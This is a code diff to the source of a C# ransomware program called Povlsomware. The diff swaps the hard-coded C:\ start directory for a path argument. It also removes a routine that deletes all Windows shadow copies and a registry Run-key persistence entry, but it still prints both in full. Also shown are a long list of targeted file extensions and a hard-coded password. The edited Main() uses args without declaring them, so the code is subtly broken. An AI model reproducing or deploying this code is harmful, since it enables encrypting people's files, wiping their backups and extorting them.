@@ -17,7 +17,7 @@ namespace Povlsomware
         public static List<string> encryptedFiles = new List<string>();
         private static char[] password = new char[] { 'b', 'l', 'a', 'h', 'b', 'l', 'a', 'h' };
         private static readonly string[] extensionsToEncrypt = { "avdn", "7z", "rar", "zip", "m3u", "m4a", "mp3", "wma", "ogg", "wav", "sqlite", "sqlite3", "img", "nrg", "tc", "doc", "docx", "docm", "odt", "rtf", "wpd", "wps", "csv", "key", "pdf", "pps", "ppt", "pptm", "pptx", "ps", "psd", "vcf", "xlr", "xls", "xlsx", "xlsm", "ods", "odp", "indd", "dwg", "dxf", "kml", "kmz", "gpx", "cad", "wmf", "txt", "3fr", "ari", "arw", "bay", "bmp", "cr2", "crw", "cxi", "dcr", "dng", "eip", "erf", "fff", "gif", "iiq", "j6i", "k25", "kdc", "mef", "mfw", "mos", "mrw", "nef", "nrw", "orf", "pef", "png", "raf", "raw", "rw2", "rwl", "rwz", "sr2", "srf", "srw", "x3f", "jpg", "jpeg", "tga", "tiff", "tif", "ai", "3g2", "3gp", "asf", "avi", "flv", "m4v", "mkv", "mov", "mp4", "mpg", "rm", "swf", "vob", "wmv" }; //files to decrypt
-
+        public static string path; //let other classes access, static is a must
 
         [STAThread]
         public static char[] GetPass()
@@ -27,29 +27,22 @@ namespace Povlsomware
 
         static void Main()
         {
-            //Start the attack
-            Attack();
-            
-            //Destroy ShadowCopy
-            DestroyCopy();
-            
-            //Add simple persistance
-            SetStartup();
+            //get argument
+            if (args.Length != 1)
+            {
+                Console.WriteLine("Please only input 1 argument (path)");
+            }
 
+            path = args[0];
+            
+            //Start the attack
+            Attack(path);
+            
             //Creates a popup that lets you view the encrypted files and add the password
             CreateUI();
 
         }
 
-        static void SetStartup()
-        {
-            RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
-            if (rk.GetValue("Povlsomware") == null && !Application.ExecutablePath.Contains("rundll32.exe"))
-            {
-                rk.SetValue("Povlsomware", "\"" + Application.ExecutablePath + "\"");
-            }
-
-        }
 
         static void CreateUI()
         {
@@ -83,39 +76,6 @@ namespace Povlsomware
             }
         }
 
-        public static void DestroyCopy()
-        {
-            bool isElevated;
-            using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
-            {
-                WindowsPrincipal principal = new WindowsPrincipal(identity);
-                isElevated = principal.IsInRole(WindowsBuiltInRole.Administrator);
-            }
-            
-            if (isElevated)
-            {
-                string NamespacePath = "\\\\.\\ROOT\\cimv2";
-                string ClassName = "Win32_ShadowCopy";
-                //Create ManagementClass
-                ManagementClass oClass = new ManagementClass(NamespacePath + ":" + ClassName);
-                
-                //Get all instances of the class and enumerate them
-                try {
-                    foreach (ManagementObject oObject in oClass.GetInstances())
-                    {
-                        //access a property of the Management object
-                        oObject.Delete();
-                    }
-                } catch (Exception e)
-                {
-                    Console.WriteLine("Could not delete shadow copy if any " + e.Message);
-                }
-
-
-            }
-            
-        }
-
         //Encrypt the file
         public static void EncryptFile(string fileUnencrypted)
         {
@@ -147,15 +107,15 @@ namespace Povlsomware
             }
         }
 
-        public static void Attack()
+        public static void Attack(string path)
         {
-            string startDirectory = @"C:\"; //Where to start from
+            string startDirectory = path; //Where to start from
             ProcessDirectory(startDirectory, 1, "");
         }
 
-        public static void UndoAttack(string decryption_password)
+        public static void UndoAttack(string decryption_password, string path)
         {
-            string startDirectory = @"C:\"; //Where to start from
+            string startDirectory = path; //Where to start from
             ProcessDirectory(startDirectory, 0, decryption_password);
         }
 
